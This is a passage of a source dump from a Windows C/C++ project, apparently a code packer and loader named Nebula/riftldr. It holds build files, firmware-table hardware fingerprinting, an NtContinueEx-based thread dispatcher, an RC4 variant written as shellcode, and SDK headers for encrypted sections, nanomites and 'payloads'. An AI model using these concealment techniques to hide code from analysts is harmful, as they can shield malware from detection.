      <ExceptionHandling>false</ExceptionHandling>
      <BasicRuntimeChecks>Default</BasicRuntimeChecks>
      <RuntimeLibrary>
      </RuntimeLibrary>
      <PreprocessorDefinitions>_DEBUG;_LIB</PreprocessorDefinitions>
      <LanguageStandard_C>stdc17</LanguageStandard_C>
      <AdditionalOptions>
      </AdditionalOptions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <ShowProgress>LinkVerbose</ShowProgress>
      <MergeSections>
      </MergeSections>
      <EntryPointSymbol>CoreMain</EntryPointSymbol>
      <AdditionalOptions>/ignore:4254 %(AdditionalOptions)</AdditionalOptions>
    </Link>
    <Lib />
    <PostBuildEvent>
      <Command>"$(OutDir)riftbld.exe" /spp -fi:"$(TargetPath)" -sc:.nb0 -ch:e00000e0
"$(OutDir)riftbld.exe" /spp -fi:"$(TargetPath)" -sc:.nb1 -ch:000000e0
"$(OutDir)riftbld.exe" /spp -fi:"$(TargetPath)" -sc:.nb2 -ch:000000e0
copy "$(SolutionDir)src\sdk.h" "$(SolutionDir)out\sdk"
copy "$(SolutionDir)src\dbg.h" "$(SolutionDir)out\sdk"
copy "$(SolutionDir)src\base.h" "$(SolutionDir)out\sdk"</Command>
    </PostBuildEvent>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseExecutable|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <LanguageStandard>stdcpp17</LanguageStandard>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <ExceptionHandling>false</ExceptionHandling>
      <RuntimeLibrary />
      <LanguageStandard_C>stdc17</LanguageStandard_C>
      <BasicRuntimeChecks>Default</BasicRuntimeChecks>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <Optimization>MinSpace</Optimization>
      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
      <PreprocessorDefinitions>_EXE</PreprocessorDefinitions>
      <AdditionalOptions>
      </AdditionalOptions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>DebugFull</GenerateDebugInformation>
      <ShowProgress>LinkVerbose</ShowProgress>
      <LinkStatus>true</LinkStatus>
      <LinkTimeCodeGeneration>UseLinkTimeCodeGeneration</LinkTimeCodeGeneration>
      <MergeSections>
      </MergeSections>
      <EntryPointSymbol>NebulaCoreEntry</EntryPointSymbol>
      <AdditionalOptions>/ignore:4254 %(AdditionalOptions)</AdditionalOptions>
    </Link>
    <PostBuildEvent>
      <Command>"$(OutDir)riftbld.exe" /spp -fi:"$(TargetPath)" -sc:.nb0 -ch:e00000e0
"$(OutDir)riftbld.exe" /spp -fi:"$(TargetPath)" -sc:.nb1 -ch:000000e0
"$(OutDir)riftbld.exe" /spp -fi:"$(TargetPath)" -sc:.nb2 -ch:000000e0
copy "$(SolutionDir)src\sdk.h" "$(SolutionDir)out\sdk"
copy "$(SolutionDir)src\dbg.h" "$(SolutionDir)out\sdk"
copy "$(SolutionDir)src\base.h" "$(SolutionDir)out\sdk"</Command>
    </PostBuildEvent>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='ReleaseLibrary|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <LanguageStandard>stdcpp17</LanguageStandard>
      <MultiProcessorCompilation>true</MultiProcessorCompilation>
      <ExceptionHandling>false</ExceptionHandling>
      <RuntimeLibrary>
      </RuntimeLibrary>
      <LanguageStandard_C>stdc17</LanguageStandard_C>
      <BasicRuntimeChecks>Default</BasicRuntimeChecks>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <Optimization>MinSpace</Optimization>
      <FavorSizeOrSpeed>Size</FavorSizeOrSpeed>
      <PreprocessorDefinitions>_LIB</PreprocessorDefinitions>
      <AdditionalOptions>
      </AdditionalOptions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>DebugFull</GenerateDebugInformation>
      <ShowProgress>LinkVerbose</ShowProgress>
      <LinkStatus>true</LinkStatus>
      <LinkTimeCodeGeneration>UseLinkTimeCodeGeneration</LinkTimeCodeGeneration>
      <MergeSections>
      </MergeSections>
      <EntryPointSymbol>CoreMain</EntryPointSymbol>
      <AdditionalOptions>/ignore:4254 %(AdditionalOptions)</AdditionalOptions>
    </Link>
    <PostBuildEvent>
      <Command>"$(OutDir)riftbld.exe" /spp -fi:"$(TargetPath)" -sc:.nb0 -ch:e00000e0
"$(OutDir)riftbld.exe" /spp -fi:"$(TargetPath)" -sc:.nb1 -ch:000000e0
"$(OutDir)riftbld.exe" /spp -fi:"$(TargetPath)" -sc:.nb2 -ch:000000e0
copy "$(SolutionDir)src\sdk.h" "$(SolutionDir)out\sdk"
copy "$(SolutionDir)src\dbg.h" "$(SolutionDir)out\sdk"
copy "$(SolutionDir)src\base.h" "$(SolutionDir)out\sdk"</Command>
    </PostBuildEvent>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="are.cpp" />
    <ClCompile Include="ldr.cpp" />
    <ClCompile Include="core.cpp" />
    <ClCompile Include="utl.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="ldr.h" />
  </ItemGroup>
  <ItemGroup>
    <MASM Include="x64.asm" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.targets" />
  </ImportGroup>
</Project>
```

`src/riftldr/riftldr.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="src">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="hdr">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="ldr.cpp">
      <Filter>src</Filter>
    </ClCompile>
    <ClCompile Include="are.cpp">
      <Filter>src</Filter>
    </ClCompile>
    <ClCompile Include="utl.cpp">
      <Filter>src</Filter>
    </ClCompile>
    <ClCompile Include="core.cpp">
      <Filter>src</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="ldr.h">
      <Filter>hdr</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <MASM Include="x64.asm">
      <Filter>src</Filter>
    </MASM>
  </ItemGroup>
</Project>
```

`src/riftldr/utl.cpp`:

```cpp
// Utilities and more ;)
#include "ldr.h"

namespace utl {
	struct SYSTEM_FIRMWARE_TABLE_INFORMATION {
		ULONG ProviderSignature;
		ULONG Action;
		ULONG TableID;
		ULONG TableBufferLength;
		UCHAR TableBuffer[];
	};

	status GenerateSessionId(
		_Out_ u64& SessionId
	) {
		handle Heap = GetProcessHeap();
		SessionId = Fnv64OffsetBasis;

		const dword ProviderSignatures[] = { 'ACPI', 'FIRM', 'RSMB' };
		for (auto i = 0; i < 3; i++) {
			// Enumerate table entries
			auto IdentifierTable = (SYSTEM_FIRMWARE_TABLE_INFORMATION*)HeapAlloc(Heap, 0, 16);
			dword ReturnLength;
			IdentifierTable->ProviderSignature = ProviderSignatures[i];
			IdentifierTable->Action = 0;
			IdentifierTable->TableID = 0;
			IdentifierTable->TableBufferLength = 0;
			auto NtStatus = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0x4c,
				IdentifierTable, 16, &ReturnLength);
			if (NtStatus == 0xc0000002) // Not implemented -> skip
				continue;
			if (NtStatus != 0xc0000023) // Buffer insufficient
				return S_CREATE(SS_ERROR, SF_CORE, SC_UNKNOWN);
			IdentifierTable = (SYSTEM_FIRMWARE_TABLE_INFORMATION*)HeapReAlloc(Heap,
				0, IdentifierTable, IdentifierTable->TableBufferLength + 16);
			NtStatus = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0x4c,
				IdentifierTable, IdentifierTable->TableBufferLength + 16, &ReturnLength);
			if (!NT_SUCCESS(NtStatus))
				return S_CREATE(SS_ERROR, SF_CORE, SC_UNKNOWN);

			for (auto j = 0; j < IdentifierTable->TableBufferLength / sizeof(dword); j++) {
				// Get firmware tables
				auto FirmwareTable = (SYSTEM_FIRMWARE_TABLE_INFORMATION*)HeapAlloc(Heap, 0, 16);
				FirmwareTable->ProviderSignature = ProviderSignatures[i];
				FirmwareTable->Action = 1;
				FirmwareTable->TableID = ((dword*)IdentifierTable->TableBuffer)[j];
				FirmwareTable->TableBufferLength = 0;
				NtStatus = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0x4c,
					FirmwareTable, 16, &ReturnLength);
				if (NtStatus != 0xc0000023)
					return S_CREATE(SS_ERROR, SF_CORE, SC_UNKNOWN);
				FirmwareTable = (SYSTEM_FIRMWARE_TABLE_INFORMATION*)HeapReAlloc(Heap,
					0, FirmwareTable, FirmwareTable->TableBufferLength + 16);
				NtStatus = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0x4c,
					FirmwareTable, FirmwareTable->TableBufferLength + 16, &ReturnLength);
				if (!NT_SUCCESS(NtStatus))
					return S_CREATE(SS_ERROR, SF_CORE, SC_UNKNOWN);

				// Hash Table
				Fnv1a64Hash(FirmwareTable->TableBuffer, FirmwareTable->TableBufferLength, SessionId);
				HeapFree(Heap, 0, FirmwareTable);
			}

			HeapFree(Heap, 0, IdentifierTable);
		}

		return SUCCESS;
	}

	// this generates a true hardware Id by parsing the table
	// and only hashing specific entries (also avoiding specific fields)
	status GenerateHardwareId(
		_Out_ u64& HardwareId
	) {
		handle Heap = GetProcessHeap();
		HardwareId = Fnv64OffsetBasis;

		// Get SMBios Table
		auto FirmwareTable = (SYSTEM_FIRMWARE_TABLE_INFORMATION*)HeapAlloc(Heap, 0, 16);
		FirmwareTable->ProviderSignature = 'RSMB';
		FirmwareTable->Action = 1;
		FirmwareTable->TableID = 0x0000;
		FirmwareTable->TableBufferLength = 0;
		dword ReturnLength;
		auto NtStatus = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0x4c,
			FirmwareTable, 16, &ReturnLength);
		if (NtStatus != 0xc0000023)
			return S_CREATE(SS_ERROR, SF_CORE, SC_UNKNOWN);
		FirmwareTable = (SYSTEM_FIRMWARE_TABLE_INFORMATION*)HeapReAlloc(Heap,
			0, FirmwareTable, FirmwareTable->TableBufferLength + 16);
		NtStatus = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0x4c,
			FirmwareTable, FirmwareTable->TableBufferLength + 16, &ReturnLength);
		if (!NT_SUCCESS(NtStatus))
			return S_CREATE(SS_ERROR, SF_CORE, SC_UNKNOWN);

		// Get First Entry
		typedef struct SmBiosTableHeader {
			byte bType;
			byte nLength;
			WORD wHandle;
		};
		auto Entry = (SmBiosTableHeader*)((ptr)FirmwareTable->TableBuffer + 8);

		// Walk Entries
		while (Entry->bType != 127) {
			// Start of String Table and Get Entry Size and next Entry Address
			auto StringTable = (void*)((ptr)Entry + Entry->nLength);
			while (*(word*)StringTable != 0x0000)
				((ptr&)StringTable)++;
			size_t EntrySize = ((ptr)StringTable + 2) - (ptr)Entry;

			// Test if Entry should be hashed
			const byte DataEntryTypes[] = {
				// 0x00, // BIOS            : O
				   0x02, // Baseboard       : X
				   0x04, // Processor       : S
				   0x07, // Cache           : O
				// 0x08, // Ports           : O
				// 0x09, // Slots           : O
				// 0x10, // Physical Memory : O
				// 0x11  // Memory Devices  : O
			};
			for (auto i = 0; i < sizeof(DataEntryTypes); i++) {
				if (Entry->bType == DataEntryTypes[i])
					switch (Entry->bType) {
					case 4:
						// Avoid "Current Speed" Field
						Fnv1a64Hash(Entry, 0x16, HardwareId);
						Fnv1a64Hash(Entry + 0x18, EntrySize - 0x18, HardwareId);
						break;

					default:
						Fnv1a64Hash(Entry, EntrySize, HardwareId);
					}
			}

			// Set Address of next Entry
			(ptr&)Entry += EntrySize;
		}

		HeapFree(Heap, 0, FirmwareTable);
		return SUCCESS;
	}
}

#pragma region Fast DoublyLinkedList Implmentation
DoublyLinkedList::DoublyLinkedList(
	_In_ handle Heap
) : m_MemoryContainer(Heap),
	m_LastEntry(nullptr) {}

handle DoublyLinkedList::AllocateObject( // Allocates an object and links it into the list (can NOT be locked in shared mode)
	_In_ size_t ObjectSize               // The amount of memory to allocate for the object
) {
	LockListExclusive();
	auto Object = AllocateEntryInternal(ObjectSize);
	Object->Misc.EntrySize = ObjectSize | 1ull << 63;
	UnlockList();
	return EncodePointer((void*)Object);
}
handle DoublyLinkedList::ReferenceObject( // References an object and links it into the list (can NOT be locked in shared mode)
	_In_ void* VirtualAddress             // The absolute address of the existing object
) {
	LockListExclusive();
	auto Object = AllocateEntryInternal(0);
	Object->Misc.VirtualAddress = VirtualAddress;
	UnlockList();
	return EncodePointer((void*)Object);
}

void DoublyLinkedList::DestroyObject(
	_In_ handle Object
) {
	LockListExclusive();
	auto CurrentEntry = (ListEntry*)DecodePointer(Object);

	if (CurrentEntry->NextEntry && CurrentEntry->PreviousEntry) {
		// Fix up links (link previous and next entry to each other)
		CurrentEntry->PreviousEntry->NextEntry = CurrentEntry->NextEntry;
		CurrentEntry->NextEntry->PreviousEntry = CurrentEntry->PreviousEntry;
	} else {                                                  // Special Handling incase it is first or last entry
		if (CurrentEntry->NextEntry) {                        // Remove first entry
			CurrentEntry->NextEntry->PreviousEntry = nullptr;
			m_FirstEntry = CurrentEntry->NextEntry;
		} else if (CurrentEntry->PreviousEntry) {             // Remove last entry
			CurrentEntry->PreviousEntry->NextEntry = nullptr;
			m_LastEntry = CurrentEntry->PreviousEntry;
		} else                                                // Remove last existing entry
			m_LastEntry = nullptr;
	}

	HeapFree(m_MemoryContainer, 0, CurrentEntry);
	UnlockList();
}

void* DoublyLinkedList::GetObjectAddress(
	_In_ handle Object
) {
	auto CurrentEntry = (ListEntry*)DecodePointer(Object); // Get real object
	if (CurrentEntry->Misc.EntrySize < 0)                  // Check if local object
		return CurrentEntry + 1;                           // is local object
	return CurrentEntry->Misc.VirtualAddress;              // is referenced object
}
size_t DoublyLinkedList::GetObjectSize(
	_In_ handle Object
) {
	auto CurrentEntry = (ListEntry*)DecodePointer(Object);  // Get real object
	if (CurrentEntry->Misc.EntrySize < 0)                   // Check if local object
		return CurrentEntry->Misc.EntrySize & (~0ull >> 1); // is local object
	return null;                                            // is referenced object
}

handle DoublyLinkedList::GetFirstObject() {
	return m_FirstEntry ? EncodePointer(m_FirstEntry) : null;
}
handle DoublyLinkedList::GetLastObject() {
	return m_LastEntry ? EncodePointer(m_LastEntry) : null;
}
handle DoublyLinkedList::GetNextObject(
	_In_ handle Object
) {
	auto CurrentEntry = (ListEntry*)DecodePointer(Object);
	return CurrentEntry->NextEntry ? EncodePointer(CurrentEntry->NextEntry) : null;
}
handle DoublyLinkedList::GetPreviousObject(
	_In_ handle Object
) {
	auto CurrentEntry = (ListEntry*)DecodePointer(Object);
	return CurrentEntry->PreviousEntry ? EncodePointer(CurrentEntry->PreviousEntry) : null;
}

void DoublyLinkedList::LockListExclusive() {
	if (!TryAcquireSRWLockExclusive(&m_ListLock.SrwLockInternal)) {
		if (m_ListLock.OwningThread == GetCurrentThreadId())
			m_ListLock.ExclusiveRecursionCount++;
		else
			m_ListLock.OwningThread = GetCurrentThreadId();
	}

	m_ListLock.OwningThread = GetCurrentThreadId();
	m_ListLock.ExclusiveModeEnabled = true;
}
void DoublyLinkedList::LockListShared() {
	if (m_ListLock.ExclusiveModeEnabled && m_ListLock.OwningThread == GetCurrentProcessId())
		m_ListLock.ExclusiveRecursionCount++;
	else
		AcquireSRWLockShared(&m_ListLock.SrwLockInternal);
}
void DoublyLinkedList::UnlockList() {
	if (m_ListLock.ExclusiveModeEnabled) {
 		if (m_ListLock.OwningThread == GetCurrentThreadId()) {
			if (m_ListLock.ExclusiveRecursionCount)
				m_ListLock.ExclusiveRecursionCount--;
			else {
				ReleaseSRWLockExclusive(&m_ListLock.SrwLockInternal);
				m_ListLock.ExclusiveModeEnabled = false;
			}
		}
	} else
		ReleaseSRWLockShared(&m_ListLock.SrwLockInternal);
}

DoublyLinkedList::ListEntry* DoublyLinkedList::AllocateEntryInternal( // Allocates an Object an
	_In_ size_t ObjectSize
) {
	// Allocate the Object
	auto Object = (ListEntry*)HeapAlloc(m_MemoryContainer, 0, ObjectSize + sizeof(ListEntry));
	if (!Object)
		return nullptr;

	// Link object into list (instert after last object)
	if (m_LastEntry) {
		m_LastEntry->NextEntry = Object;
		Object->PreviousEntry = m_LastEntry;
		Object->NextEntry = nullptr;
		m_LastEntry = Object;
	} else
		m_FirstEntry = m_LastEntry = Object;
	return Object;
}
#pragma endregion

```

`src/riftldr/x64.asm`:

```asm
; Thread-Interrupt-Dispatcher - START ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Offsets
CONTEXT_RAX    equ 78h ; offset of Rax in CONTEXT

CALLBACK       equ 10h ; Shadowspace (used for parameter passing)
USER_CONTEXT   equ 18h
THREAD_CONTEXT equ 20h
RTL_BARRIER    equ 28h

;; Required Win32 Api's
includelib ntdllp.lib
includelib kernel32.lib
extern NtContinueEx                : proc
extern EnterSynchronizationBarrier : proc
extern RaiseException              : proc
.code

;; Thread Interrupt Dispatcher - Similar to ntdll!KiUserApcDispatcher
ThreadInterruptDispatcher proc FRAME
.endprolog
	;; Store returnvalue (syscall handling)
	lea  rbx, [rsp + THREAD_CONTEXT] ; Load address of restorepoint
	mov  [rbx + CONTEXT_RAX], rax    ; Safe retunvalue

	;; Call userdefined Callback
	mov  rcx, [rsp + USER_CONTEXT]   ; Load UserText
	mov  rax, [rsp + CALLBACK]       ; Load Callback
	call rax                         ; Call Callback

	;; Synchronize apc's (optional)
	mov  rcx, [rsp + RTL_BARRIER]    ; Load barrier address
	test rcx, rcx                    ; Check if ptr is valid
	jz   RestoreContext              ; If not nullptr coninue
	xor  rdx, rdx                    ; null second parameter
	call EnterSynchronizationBarrier ; Call Synchronization

RestoreContext:
	;; Restore original thread context
	mov  rcx, [rsp + THREAD_CONTEXT] ; Load restorepoint
	xor  rdx, rdx                    ; null second parameter
	call NtContinueEx                ; Call NtContinueEx
	mov [rsp], rax                   ; Store error code

	; First try to raise an exception (let the programm handle the issue)
	mov rcx, rax                     ; Pass error code
	xor rdx, rdx                     ; Zero second to last parameter
	mov r8,  rdx
	mov r9,  rdx
	call RaiseException              ; Call RaiseException

	; Incase the exception was handled but code execution still continues
	; terminate the programm forcefully / quickly
	mov ecx, [rsp]                   ; ErrorCode
	int 29h                          ; __fastfail
ThreadInterruptDispatcher endp
; Thread-Interrupt-Dispatcher - END ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
end
```

`src/scs/rc4mod.c`:

```c
// rc4mod shellcode, compile with: >cl /c /O2 /Oi /GS-
#include <sal.h>

// Integer Types
typedef unsigned char      u8;
typedef unsigned long      u32;
typedef unsigned long long u64;

/* Config Format:
   BBBBBBBB|BBBBBBBB | BBBBBBBBB | BBBBBBBB|BBBBBBBB | B | BBBBBBBBBBBBBBBB
   ctx.i :8 ctx.j :8 | keylen :9 | SBoxOff  OffsetBa |   | Zerorounds   :16

   Region Format:
   BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB | BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
   Offset relative to base      :32 | size of region               :32   */
#define OFFSETBASE 17
#define SBOXINIT   25
#define KEYLEN     33
#define CTXJ       42
#define CTXI       50



__forceinline void swap8( // Swaps 2 bytes
	_In_ u8* x,           // byte 1
	_In_ u8* y            // byte 2
) {
	// y = _InterlockedExchange8(x, *y);
	u8 k = *x;
	*x = *y;
	*y = k;
}



typedef struct _rc4ctx { // RC4 Context
	u8 SBox[256];        // The Substitution-Box
	u8 i, j;             // RC4 SBox-State
} rc4ctx;

__forceinline void ksa(                   // KeyStream-Scheduling-Algorithm (KSA)
	_In_               rc4ctx* ctx,       // RC4 internal context
	_In_               void*   KeyStream, // The key used to initialize the state
	_In_range_(1, 256) int     KeyLength  // The length of the key to use in bytes
) {
	for (int i = 0; i < 256; i++)
		ctx->SBox[ctx->i++] = i;
	for (int i = 0; i < 256; i++) {
		ctx->j += ctx->SBox[i] + ((u8*)KeyStream)[i % KeyLength];
		// swap8(&ctx->SBox[i], &ctx->SBox[ctx->j]);
		ctx->SBox[i] = _InterlockedExchange8(&ctx->SBox[ctx->j], ctx->SBox[i]);
	}
}
__forceinline u8 prg(   // Pseudo-Random-Generation (PRG)
	_In_ rc4ctx* ctx,   // RC4 internal context
	_In_ u8      Offset // has to be coprime realative to 256 (optimal 15)
) {
	ctx->j = (ctx->i += Offset) + ctx->SBox[ctx->i];               // Modified SBox Translation
	// swap8(&ctx->SBox[ctx->i], &ctx->SBox[ctx->j]);              // Mutate SBox by swap
	ctx->SBox[ctx->i] = _InterlockedExchange8(&ctx->SBox[ctx->j], ctx->SBox[ctx->i]);
	return ctx->SBox[(u8)(ctx->SBox[ctx->i] + ctx->SBox[ctx->j])]; // Resolve output byte
}

void crypt(               // Crypts a buffer with RC4 cipher (RC4 modification)
	_Inout_ void* Buffer, // The input data to be crypted
	_In_    u64   Region, // The area of the input to be ciphered
	_In_    void* Key,    // The key to be used in the encryption
	_In_    u64   Config  // describes how the algorithim is scheduled
) {
	// Initialize context
	rc4ctx ctx;
	ctx.i = Config >> SBOXINIT & 0xff;
	ctx.j = Config >> CTXJ & 0xff;
	ksa(&ctx, Key, Config >> KEYLEN & 0x1ff);

	// ZeroRounds
	ctx.i = Config >> CTXI & 0xff;
	u8 w = Config >> OFFSETBASE & 0xff;
	while (Config-- & 0xffff)
		prg(&ctx, w);
	u32 rva = Region >> 32;
	(u64)Buffer += rva;
	while(rva--)
		prg(&ctx, w);

	// Crypt Buffer
	while (Region-- & ~0ul)
		*((u8*)Buffer)++ ^= prg(&ctx, w);
}
```

`src/sdk.h`:

```h
/* Nebula-SDK/API Header provides all Names and Declarations required
   in order to code Plugins/Extensions and Payloads */
#pragma once

/* This block automatically activates the SDK
   enabling certain features and providing delcarations
   (do not manually disable the sdk for client code,
   this feature is reserved for internal use) */
#ifndef _NB_SDK
#define _NB_SDK 1
#endif

// Enable SDK debug features (optional)
#ifdef _NB_SDK_PROVIDE_DEBUG
#include "dbg.h"
#endif
#include "base.h"
#pragma comment(lib, "ntdllp.lib") // Link against ntdll (Full link through private lib)


#pragma region Nebula Protection SDK v1 (deprecated)
#define N_PSRW1 ".nbrw1" // Protected Sections (Read/Write rwx)
#define	N_PSRW2 ".nbrw2"

#define N_PS0   ".nb0" // Unprotected default section
                       // everything that is unspecified is put here
#define N_PS1   ".nb1" // Core protected code and data (packed and encrypted)
                       // will be decrypted and unpacked during TLS
#define N_PS2   ".nb2" // Intermediate protected code and data (encrypted)
                       // stuff that should be unreadable unless actively used,
#pragma endregion



#pragma region Nebula Protect SDKv2
#define NB_NBDS ".nb0" // Nebula's default section,
                      // everything that is not explicitly allocated is stored in here
                      // this includes code and data, both of which can be crypted.
                      // This section can NOT be compressed and is rwx protected.
#define NB_NBPS ".pk0" // Nebula's default compressed section,
                      // this is the default section for all data and code internaly used,
                      // that is not required to be present for initialization.
                      // Crypted code or data can also be stored here, however the compression
                      // will mostlikely proof itself ineffective.

#pragma section(".nbft", read) // NebulaProtectSeg - Everything in here is pure
                               // data and is used internaly by the core and builder.
                               // This can later just be merged into the main section,
                               // that is if its not stripped by the builder entirely.

#pragma region Nebula Crypto Table
#define NB_CRYPTFUNC    NOINLINE
#define NB_COMPRESSFUNC ALLOC_CODE(NB_NBPS)
#define NB_CRYPTDATA
#define NB_COMPRESSDATA ALLOC_DATA(NB_NBPS)

/* Nebula Dynamic Table's:
   Dynamic tables allocated at compiletime in a mergable way. */
#pragma pack(1)
__declspec(align(1)) typedef struct _NbTableEntry {
	void* AbsoluteAddress; // The address of a function or data (this is absolute)
	u32   SizeOfData;      // The size of the function or data
	                       // if its a function the size will be patched in by the builder
	union {
		struct {
			u8 IsFunction       : 1; // Defines if the entry describes a function
			u8 Nanomites        : 1; // Tells the builder to patch in nanomites for this function
			u8 EncryptObject    : 1; // Signals the builder to encrypt the function
			u8 RegisterFunction : 1; // Automatically registers the function for singlestep decryption
			u8 DecipherOnLoad   : 1; // the function is crypted but automatically decrypted on startup
			u8 Reserved         : 3; // reserved for future use (must be 0)
		};
		u8     Flags;
	} NbFFlags;
	u32   Vector[4];       // A KeyEntry, each crypted object can have its own key
} NbTableEntry;
#pragma pack()

#define NB_CRYPT 0x04
#define NB_NANO  0x02
#define NB_REGPG 0x08
#define NB_AUTOD 0x10

#pragma section(".nbft$ctableb", read)




#define NB_CMARKFUNCTION(FunctionAddress, FFFlags, EntryName)

#ifdef __cplusplus
template<int> struct NbCryptTable { static _NbTableEntry Entry; };
/* Creates a automatic nameless function entry in the nbft
   FunctionAddress : The address of the function for which an entry should be created
   FFlags          : These flags specify how the function should be treated by the runtime,
                     as well as what the builder should do with them */
#define N_CREATEFET(FunctionAddress, FFlags) ALLOC_DATA(".nbft$ctableb")\
constexpr NbTableEntry NbCryptTable<__COUNTER__>::Entry = { FunctionAddress, 0,  };
#define N_CREATEDET(DataAddress, Size) ALLOC_DATA(".nbft$ctableb")\
constexpr NbTableEntry NbCryptTable<__COUNTER__>::Entry = { DataAddress, 0, Size };

// Allocate nullterminating entry
#pragma section(".nbft$ctablez", read)
ALLOC_DATA(".nbft$ctablez") NbTableEntry NbCryptTable<__COUNTER__>::Entry = { null };
#else
ALLOC_DATA(".nbft$ctablez") NbTableEntry _Nb = { null };
#endif
#pragma endregion
#pragma endregion

#if _NB_SDK
/* Example: Call a servicefunction and pass 2 parameters
	poly ParameterList[2];
	ParameterList[0] = "String Part 1";
	ParameterList[1] = 0x1234;
	poly ReturnValue;
	status StatusCode = vServiceCall(SERVICE_ID, &ReturnValue, (poly)ParameterList);
*/
#endif

// ThreadInterruptService
typedef void(__x64call* tapc_t)(
	_In_opt_ poly UserContext // Callback defined Context
	);

#pragma region ModuleEntry
#define N_ONLOAD    1
#define N_RUNMOD    2
#define N_UNLOAD    3
#define N_FATAL     4
#define N_VIOLATION	5
#define N_DEFECT    6
#define N_SHUTDOWN  7

typedef status(__x64call* cec_t)(      // Client Entrypoint Callback (CEC)
	_In_        i32    CallReason,     // The reason for the call
	_Inout_opt_ void*  PointerTable[8] // Pointer table used to pass info to the core
	);
#pragma endregion

#undef _NB_SDK

```

`src/shr/itl.h`:

```h
// Inline/Template Library: Defines templates, inline and constant expression functions
#pragma once

#ifdef __cplusplus
// NoCRT Allocators for Objects
inline void* __cdecl operator new(size_t size) {
	return HeapAlloc(GetProcessHeap(), NULL, size);
}
inline void __cdecl operator delete(void* mem) {
	HeapFree(GetProcessHeap(), NULL, mem);
}
inline void* __cdecl operator new(size_t, void* Address) {
	return Address;
}
inline void __cdecl operator delete(void* mem, size_t) {}

namespace utl {
#pragma region Fnv1a Algorithms
	constexpr u64 Fnv64OffsetBasis = 0xcbf29ce484222325;
	constexpr void Fnv1a64Hash( // Generates a 64-Bit wide FNV-1a hash
		_In_    void*  Data,    // Pointer to data to hash
		_In_    size_t Size,    // Size of data to hash in bytes
		_Inout_ u64&   Hash     // The hash to be updated

	) {
		while (Size--)
			Hash = (Hash ^ *((byte*&)Data)++) * 0x00000100000001b3;
	}
	constexpr u64 Fnv1a64Hash( // Generates a 64-Bit wide FNV-1a hash
		_In_ void*  Data,      // Pointer to data to hash
		_In_ size_t Size       // Size of data to hash in bytes
	) {
		auto Hash = Fnv64OffsetBasis;
		Fnv1a64Hash(Data, Size, Hash);
		return Hash;
	}

	// FNV1A32 ONLY IMPLEMENTED FOR COMPLETENES, ALWAYS USE 64-BIT VERSION UNLESS NECESSARY
	constexpr u32 Fnv32OffsetBasis = 0x811c9dc5;
	constexpr void Fnv1a32Hash( // Generates a 32-Bit wide FNV-1a hash
		_In_    void*  Data,    // Pointer to data to hash
		_In_    size_t Size,    // Size of data to hash in bytes
		_Inout_ u32&   Hash     // The hash to be updated

	) {
		while (Size--)
			Hash = (Hash ^ *((byte*&)Data)++) * 0x01000193;
	}
	constexpr u32 Fnv1a32Hash( // Generates a 32-Bit wide FNV-1a hash
		_In_ void*  Data,      // Pointer to data to hash
		_In_ size_t Size       // Size of data to hash in bytes
	) {
		auto Hash = Fnv32OffsetBasis;
		Fnv1a32Hash(Data, Size, Hash);
		return Hash;
	}
#pragma endregion

	constexpr u64 RoundUpToMulOfPow2(
		_In_ u64 Number,
		_In_ u64 Multiplier
	) {
		return (Number + (Multiplier - 1)) & -Multiplier;
	}
}
#endif

```

`src/shr/nbp.h`:

```h
// Nebula-private, internal file shared between the core projects, provides intercompatibility
#pragma once

#include "..\base.h"
#include "..\dbg.h"
#include "itl.h"

